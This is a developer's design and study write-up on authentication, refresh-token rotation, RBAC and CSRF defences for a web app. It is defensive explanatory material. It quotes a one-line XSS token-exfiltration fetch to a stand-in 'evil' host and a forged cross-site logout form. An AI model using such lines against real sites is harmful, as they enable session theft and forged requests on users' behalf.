# M2: Authentication, sessions and RBAC

## What was built

- **GitHub sign-in** (`app/api/auth.py`, `app/services/github_oauth.py`, `app/services/auth.py`): the OAuth web flow for a GitHub App, with `state` and **PKCE**. On login we sync the user, their installations, their role in each, the repos they can see (`repository_access`), then revoke the GitHub token.
- **Our own sessions** (`app/core/security.py`, `app/services/sessions.py`): a 15-minute access JWT and a 7-day rotating refresh token, both in httpOnly cookies. Refresh tokens are stored hashed, grouped in families, and **reuse of an old one revokes the whole family**.
- **RBAC** (`app/deps.py`, `app/services/rbac.py`): `get_current_user`, `require_installation_role(min_role)` (owner > admin > member) and `require_repository_access`. Endpoints: `GET /me`, `GET /installations/{id}` (member), `GET /installations/{id}/members` (admin).
- **Protection middleware**: CSRF (custom header + Origin), CORS locked to `WEB_ORIGIN`, security headers, and a Postgres-backed per-IP rate limit on `/auth/*`.
- **Migration** `e85dfdbdfe80`: `refresh_tokens.family_id` / `rotated_at`, `repository_access`, `rate_limit_counters`.
- **Frontend**: login page, `AuthProvider` (a TanStack query of `/me`), `ProtectedRoute`, sign-out, and an API client that refreshes on 401 **single-flight**.
- **ADR 0002**: why the browser talks to the API through a same-site `/api` proxy, the CSRF design, and the SSE risk for M9.
- **Tests**: 156 API tests (68 unit, 88 integration against real Postgres, GitHub mocked with respx) and 14 web tests. Three checks were deliberately broken once to prove the tests notice (state comparison, role check, single-flight).

## Authentication vs authorization

- **Authentication (authN)**: *who are you?* GitHub proves the identity once; after that our access JWT says "this is user `3f2c…`". `get_current_user` does authN.
- **Authorization (authZ)**: *what may you do?* Decided on **every request** from the database: your role in the installation, and whether you have a `repository_access` row for the repo. `require_installation_role` and `require_repository_access` do authZ.

The access token deliberately contains **no roles**. If it did, an admin demoted on GitHub would keep admin rights until the token expired. Because roles are read from the DB per request, a change takes effect at the next login sync, at most 7 days later (decision 14), and immediately if we delete the row.

Status codes tell the story: **401** = "we don't know who you are" (log in / refresh); **403** = "we know you, you're a member, but your role is too weak"; **404** = "you're not a member" (we don't even confirm the installation exists).

## The OAuth login, step by step

```mermaid
sequenceDiagram
    autonumber
    participant B as Browser
    participant W as Web (Vite / Vercel)<br/>localhost:5173
    participant A as API (FastAPI)
    participant G as GitHub
    participant D as Postgres

    B->>W: click "Sign in with GitHub" (GET /api/auth/github/login)
    W->>A: GET /auth/github/login (proxy strips /api)
    A->>A: random state + PKCE verifier,<br/>challenge = BASE64URL(SHA256(verifier))
    A-->>B: 302 to github.com/login/oauth/authorize?client_id,redirect_uri,state,code_challenge<br/>Set-Cookie cl_oauth = signed{state, verifier} (HttpOnly, 10 min)
    B->>G: consent page
    G-->>B: 302 to /api/auth/github/callback?code=…&state=…
    B->>A: GET /auth/github/callback (cl_oauth cookie attached)
    A->>A: verify cookie signature + expiry,<br/>compare state (constant time). Mismatch → /login?error=invalid_state
    A->>G: POST /login/oauth/access_token (code, client secret, code_verifier)
    G-->>A: user token (ghu_…), only in a local variable
    A->>G: GET /user, /user/installations, /user/installations/{id}/repositories,<br/>/user/memberships/orgs/{org}
    A->>G: DELETE /applications/{client_id}/token (revoke, best effort)
    A->>D: upsert users, installations, members, repositories;<br/>replace memberships + repository_access; new refresh-token family
    A-->>B: 302 to WEB_ORIGIN/dashboard<br/>Set-Cookie cl_access (JWT, 15 min), cl_refresh (random, 7 days, Path=/api/auth); delete cl_oauth
    B->>A: GET /api/me (cookies attached automatically)
    A-->>B: user + installations + roles
```

Why each piece exists:

- **`state`** stops *login CSRF*: without it, an attacker could send you a callback link from **their** login attempt, and you would silently be signed into the attacker's account (and, say, connect your repos to it). The expected state lives in a cookie only your browser has.
- **The state cookie is signed (a JWT)**, so nobody can forge a cookie that matches a state they chose. It expires in 10 minutes, as GitHub's code does.
- **PKCE** binds the authorization code to this browser's attempt: a code stolen from a log or a Referer header is useless without the verifier, which never left our cookie.
- **Form body, not query string**, for the client secret: URLs end up in logs.
- **The GitHub user token is never stored**: it lives in one local variable, is used for the sync, then revoked. We never call GitHub as the user again. The worker will use the **App's** installation tokens (M3), a separate auth system.

## Sessions and refresh-token rotation

```mermaid
sequenceDiagram
    autonumber
    participant B as Browser (our web app)
    participant A as API
    participant D as refresh_tokens

    Note over B,D: login created token R1 (family F, expires_at = login + 7 days)
    B->>A: GET /api/me (access JWT expired)
    A-->>B: 401 token_expired
    B->>A: POST /api/auth/refresh (cookie R1)
    A->>D: SELECT … WHERE hash = sha256(R1) FOR UPDATE
    A->>D: R1.rotated_at = now; INSERT R2 (family F, SAME expires_at)
    A-->>B: 204 + new cl_access + cl_refresh = R2
    B->>A: replay GET /api/me
    A-->>B: 200

    Note over B,D: an attacker copied R1 earlier
    participant X as Attacker
    X->>A: POST /api/auth/refresh (cookie R1)
    A->>D: R1 found, rotated_at is set → REUSE
    A->>D: UPDATE … SET revoked_at = now WHERE family_id = F (R1 and R2)
    A-->>X: 401 (revocation COMMITTED, not rolled back)
    B->>A: POST /api/auth/refresh (cookie R2)
    A-->>B: 401 revoked → user signs in again
```

The rules in `app/services/sessions.py`:

| Presented token | Result |
| --- | --- |
| unknown hash | 401 `unknown` |
| `revoked_at` set | 401 `revoked` |
| `rotated_at` set | **revoke the whole family**, 401 `reused` |
| past `expires_at` | 401 `expired` |
| otherwise | rotate: mark it, issue a successor in the same family with the same expiry |

Three details worth explaining in an interview:

1. **Why revoke the whole family?** A legitimate client only ever holds the newest token. If an old one appears, two parties hold copies and we can't tell which is the thief, so we end both sessions.
2. **Why `FOR UPDATE`?** Two simultaneous refreshes with the same token must not both succeed. The row lock serialises them; the second sees `rotated_at` and is treated as reuse.
3. **Why does the refresh route *return* a 401 instead of raising?** Our session dependency rolls back on any exception. Raising would undo the family revocation. Returning a response lets the transaction commit.

**The same expiry on every successor** makes the 7 days an *absolute* limit from login. Refreshing keeps you signed in within that window but never extends it.

### Single-flight on the client

When the access token expires, every in-flight request gets a 401 at once. If each one called `/auth/refresh`, they would all present the **same** refresh token; the server would rotate it once and then see "reuse" and log you out. `apps/web/src/api/client.ts` keeps one shared promise (`refreshInFlight`), so N failures cause one refresh and N replays. Across browser tabs, a **Web Lock** (`navigator.locks`) serialises refreshes: the second tab waits, then refreshes with the cookie the first tab just received.

## Why httpOnly cookies beat localStorage

| | `localStorage` + `Authorization` header | httpOnly cookie (ours) |
| --- | --- | --- |
| Readable by JavaScript | **Yes**: one XSS bug (a malicious npm package, an unescaped string) can `fetch('https://evil', {body: localStorage.token})` and take the token to use anywhere, for its full lifetime | **No**: `document.cookie` cannot see it, so it cannot be exfiltrated |
| Sent automatically | No (we add it) | Yes (which is why we need CSRF protection) |
| Survives a page refresh | Yes | Yes |

XSS is still bad with cookies (the script can make requests *from the victim's page* while it is open), but it cannot **steal** the session for later. Cookies trade the XSS-theft risk for a CSRF risk, and CSRF has well-understood, cheap defences. That trade is why the acceptance criterion "tokens never appear in JavaScript-readable storage" holds by construction: the web app has no code path that ever sees a token.

## What CSRF is and how we stop it

**Cross-Site Request Forgery**: while you're signed in to CodeLens, you visit `evil.example`, which contains `<form action="https://codelens.app/api/auth/logout" method="POST">` and submits it with JavaScript. The browser attaches your cookies, because they belong to codelens.app. The request is "authenticated" without you meaning to send it.

Our layers (details in ADR 0002):

1. **`SameSite=Lax`** cookies: the browser does not attach them to cross-site POSTs at all.
2. **Required header `X-Requested-With: codelens`** on every POST/PUT/PATCH/DELETE (`app/core/csrf.py`). A form cannot set headers. A cross-site `fetch` can try, but a custom header forces a CORS **preflight**, and our CORS policy only allows `WEB_ORIGIN`. It is deny-by-default middleware, so a new endpoint cannot forget it.
3. **`Origin` check**: when present, it must be exactly `WEB_ORIGIN`.
4. **GETs never change state**, so they need none of this.

## Other decisions, briefly

- **Same-site `/api` proxy, not cross-site cookies** (ADR 0002): third-party cookies are being blocked by browsers, and `SameSite=None` would throw away CSRF layer 1. The cost: the proxy may buffer SSE (verified in M7), and Vercel caches proxied responses unless told not to. Every API response is `Cache-Control: no-store`.
- **Fixed-window rate limiter in Postgres** (decision 22): one atomic `INSERT … ON CONFLICT DO UPDATE` per hit, committed in its own transaction so rejected requests still count. Simple; allows up to 2× the limit across a window boundary, which is fine for anti-brute-force.
- **Security headers**: `nosniff`, `X-Frame-Options: DENY`, strict CSP, `Referrer-Policy: no-referrer` (the callback URL contains `code` and `state`), HSTS in production only.
- **404 vs 403**: outsiders get 404 so they learn nothing; members with too weak a role get 403 because they already know the installation exists.
- **Login replaces, not merges, memberships and repo access**: whatever GitHub no longer lists is removed at the next login.

## 5 likely interview questions

1. **"Walk me through your OAuth flow. What does `state` protect against, and what does PKCE add?"** State stops login CSRF by tying the callback to a cookie only the initiating browser has. PKCE stops a stolen authorization code from being redeemed: redemption needs the verifier, which never left our signed cookie.
2. **"Why not put the JWT in localStorage?"** Any XSS can read and exfiltrate it. An httpOnly cookie can't be read by JS. Cookies bring CSRF, which we stop with SameSite=Lax, a required custom header and an Origin check.
3. **"How does refresh-token rotation detect theft?"** Each use marks the token rotated and issues a successor in the same family. A rotated token being presented again means a copy exists, so we revoke the whole family. The revocation is committed even though the response is 401.
4. **"Why aren't roles in the JWT?"** Tokens can't be un-issued. Roles in the DB are checked per request, so revoking access doesn't wait for token expiry. The cost is one indexed query per request.
5. **"What happens if two tabs refresh at the same time?"** Server: `SELECT … FOR UPDATE` serialises them; the loser would look like reuse. Client: single-flight per tab plus a Web Lock across tabs makes the second tab wait and use the new cookie, so it never happens in practice.

## Things to try breaking

1. Start a login in one browser, copy the callback URL GitHub sends you back to, and open it in a **private window**. Expect `/login?error=invalid_state`.
2. In DevTools → Application → Cookies, copy `cl_refresh`, click around until a refresh happens (or wait 15 minutes), then put the **old** value back and reload. Expect to be signed out everywhere, plus a `refresh token reuse detected` warning in the API logs.
3. Run `fetch('/api/auth/logout', {method: 'POST'})` in the console **without** the header. Expect 403 `csrf_failed`. Add `headers: {'X-Requested-With': 'codelens'}` and it works.
4. Try `document.cookie` in the console. The session cookies are not there.
5. Comment out the role check in `require_installation_role` and run `uv run pytest tests/integration/test_rbac.py`. A test must fail. Revert.
6. Hit `GET /api/auth/github/login` 21 times in a minute. Expect a 429 with `Retry-After`.
7. Set `JWT_SECRET=change-me` and start the API. Expect it to refuse to start.
